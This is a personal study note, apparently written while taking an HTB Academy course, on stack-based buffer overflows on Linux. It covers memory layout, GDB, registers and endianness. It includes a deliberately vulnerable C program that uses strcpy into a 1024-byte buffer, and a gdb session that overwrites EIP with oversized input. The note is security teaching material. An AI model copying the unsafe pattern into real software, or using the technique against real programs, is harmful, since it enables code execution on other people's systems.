<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/HTB Academy/Stack-based buffer overflow on Linux" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Stack based buffer overflow on Linux | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Stack based buffer overflow on Linux | agalera.eu"><meta data-rh="true" name="description" content="What is a buffer overflow?"><meta data-rh="true" property="og:description" content="What is a buffer overflow?"><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Stack based buffer overflow on Linux","item":"https://www.agalera.eu/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.12d8fb52.js" defer="defer"></script>
<script src="/docs/assets/js/main.f31a7f51.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/Android Fundamentals">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Hacking/HTB Academy/Android Fundamentals">HTB Academy</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Android Fundamentals">Android Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">File inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File transfers">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Active Directory">Introduction to Active Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Hardware attacks">Introduction to hardware attacks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Purple team">Introduction to Purple team</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Javascript deobfuscation">Javascript deobfuscation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Linux fundamentals">Linux fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Pentest In a Nutshell">Pentest in a nutshell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/SQL injections">SQL injections</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux">Stack based buffer overflow on Linux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows">Stack based buffer overflow on Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Web fuzzing">Web fuzzing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Windows fundamentals">Windows fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/ffuf">Fuzzing with ffuf</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB Academy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Stack based buffer overflow on Linux</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Stack based buffer overflow on Linux</h1></header>
<p>What is a buffer overflow?</p>
<p>A buffer overflow occurs when an application does not handle correctly the input data. If the data is specially crafted, it can reach to some special parts of the memory that call registers. These registers are used to process the flow of the program, therefore any user can manipulate the originally coded logic of the application just be providing a special input. In other terms, buffer overflows are errors that occur when data that is too large to fit into a buffer of the operating system&#x27;s memory overflows this buffer.</p>
<p>For example, in C language the following functions do not protect the memory: <code>strcpy</code>,<code>gets</code>,<code>sprintf</code>,<code>scanf</code>,<code>strcat</code>. Whenever you see a use of these functions, it mightt be a good indicator of a possible buffer overflow vulnerability.</p>
<p>If the <code>return address</code>register is manipulated, it allows the user to execute commands with the privilege of the application in the system.</p>
<p>The most usual cause for this vulnerability is the use of languages that rely on the developer for memory management, e.g. <code>C</code> and <code>C++</code>. The executable files are the compiled output of the application source code, the format differs from OS. In Linux, the format is <code>Executable and Linking Format (ELF)</code>, in Windows it is called <code>Portable Executable Format (PE)</code>.</p>
<p>Programs store data and instructions in memory during initialization and execution. These are data that are displayed in the executed software or entered by the user. The instructions are used to model the program flow. Among other things, return addresses are stored in the memory, which refers to other memory addresses and thus define the program&#x27;s control flow. If such a return address is deliberately overwritten by using a buffer overflow, an attacker can manipulate the program flow by having the return address refer to another function or subroutine. Also, it would be possible to jump back to a code previously introduced by the user input.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="memory-structure">Memory structure<a href="#memory-structure" class="hash-link" aria-label="Direct link to Memory structure" title="Direct link to Memory structure">​</a></h2>
<p>This this type of attack rely on a mismanagement of application memory, first we need to understand how the memory is structured.</p>
<ul>
<li>.text: actual assembler instructions of the program. Usually this section is read-only. Any write attempt will likely result in Segmentation Fault.</li>
<li>.data: contains global and static data defined by the program.</li>
<li>.bss: Several compilers and linkers use the this section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.</li>
<li>Heap: memory area allocated to each program. Memory allocated to heap can be dynamically allocated, unlike memory allocated to stacks.</li>
<li>Stack: Least-In-First-Out memory. The return address, parameters and sometimes frame pointers are stored in the stack memory. This is where local variables are stored. The linker reserves this area and usually places the stack in RAM&#x27;s lower area above the global and static variables. The contents are accessed via the <code>stack pointer</code>, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.</li>
</ul>
<p>Here is an example of a vulnerable program:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">bowfunc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1024</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">bowfunc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Done.\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>The user input is passed as an argument to the <code>bowfunc</code>. If the user introduces more than 1024 characters, the application will crash. If specially crafted input is passed, an attacker will reach to the <code>return address</code> and do whatever they want.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="gdb-introduction">GDB Introduction<a href="#gdb-introduction" class="hash-link" aria-label="Direct link to GDB Introduction" title="Direct link to GDB Introduction">​</a></h2>
<p>GDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. We can set breakpoints, observe the memory contents of the application. We can also use it to disassemble the binary into machine code.</p>
<p>In the first column, we get some numbers that represent the memory address. The numbers with the plus sign (+) show the address jumps in memory in bytes, used for the respective instruction. Next, we can see the assembler instructions with registers and their operation suffixes.</p>
<p>There are two types of syntax:</p>
<ul>
<li>AT&amp;T syntax</li>
<li>Intel syntax: The Intel syntax makes the disassembled representation easier to read</li>
</ul>
<p>To change to intel syntax, run <code>set disassembly-flavor intel</code> in <code>gdb</code>.</p>
<p>To make the change permanent, you need to write to the gdbinit file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set disassembly-flavor intel&#x27; &gt; ~/.gdbinit</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cpu-registers">CPU Registers<a href="#cpu-registers" class="hash-link" aria-label="Direct link to CPU Registers" title="Direct link to CPU Registers">​</a></h2>
<p>Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. However, some of them have a particular function. We&#x27;ll list here only the relevant registers for buffer overflow.</p>
<table><thead><tr><th>Register</th><th>Description</th></tr></thead><tbody><tr><td>EIP</td><td>Instruction Pointer stores the offset address of the next instruction to be executed</td></tr><tr><td>ESP</td><td>Stack Pointer points to the top of the stack</td></tr><tr><td>EBP</td><td>Base Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack</td></tr></tbody></table>
<p>Since the stack starts with a high address and grows down to low memory addresses as values are added, the Base Pointer points to the beginning (base) of the stack in contrast to the Stack Pointer, which points to the top of the stack.</p>
<p>Each function execution creates a Stack Frame inside the Stack. A stack frame defines a frame of data with the beginning (EBP) and the end (ESP) that is pushed onto the stack when a function is called.</p>
<p>When a function is executed with the <code>call</code> instruction, it performs two operations:</p>
<ol>
<li>it pushes the return address onto the stack so that the execution of the program can be continued after the function has successfully fulfilled its goal</li>
<li>it changes the instruction pointer (EIP) to the call destination and starting execution there.</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="endianness">Endianness<a href="#endianness" class="hash-link" aria-label="Direct link to Endianness" title="Direct link to Endianness">​</a></h2>
<p>There are two ways of reading bytes. Big-endian and little-endian. In big-endian, the digits with the highest valence are first. In little-endian, the digits with the lowest valence are at the beginning.</p>
<p>Now let&#x27;s look at an example: we need to store the following hex word <code>\xAA\xBB\xCC\xDD</code> into the memory starting by position <code>0xffff0000</code>:</p>
<table><thead><tr><th>Memory Address</th><th>0xffff0000</th><th>0xffff0001</th><th>0xffff0002</th><th>0xffff0003</th></tr></thead><tbody><tr><td>Big-Endian</td><td>AA</td><td>BB</td><td>CC</td><td>DD</td></tr><tr><td>Little-Endian</td><td>DD</td><td>CC</td><td>BB</td><td>AA</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="taking-control-of-eip">Taking control of EIP<a href="#taking-control-of-eip" class="hash-link" aria-label="Direct link to Taking control of EIP" title="Direct link to Taking control of EIP">​</a></h2>
<p>In order to successfully manipulate the execution flow, we need to be able to manipulate the instruction pointer (EIP) to tell it to which address it should jump. This will cause the EIP to jump to where our payload begins and it will start the execution.</p>
<p>We can provide a very large input to the program using python in gdb:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">student@nix-bow:~$ gdb -q bow32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x55&#x27; * 1200&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /home/student/bow/bow32 $(python -c &quot;print &#x27;\x55&#x27; * 1200&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x55555555 in ?? ()</span><br></span></code></pre></div></div>
<p>We are inserting <code>\x55</code> value 1200 times in the program std input. If we observe the registers, we can confirm that the stack can be abused and the input we introduced has leaked into the stack:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) info registers </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eax            0x1 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ecx            0xffffd6c0 -10560</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">edx            0xffffd06f -12177</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ebx            0x55555555 1431655765</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">esp            0xffffcfd0 0xffffcfd0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ebp            0x55555555 0x55555555  # &lt;---- EBP overwritten</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">esi            0xf7fb5000 -134524928</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">edi            0x0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eip            0x55555555 0x55555555  # &lt;---- EIP overwritten</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eflags         0x10286 [ PF SF IF RF ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cs             0x23 35</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ss             0x2b 43</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ds             0x2b 43</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">es             0x2b 43</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fs             0x0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gs             0x63 99</span><br></span></code></pre></div></div>
<p>Visually, the memory will look like this:</p>
<p><img decoding="async" loading="lazy" alt="Memory state with huge input" src="/docs/assets/images/stack-large-input-1ed78dea73a864c36cbb692ff55d570e.jpg" width="1280" height="555" class="img_ev3q"></p>
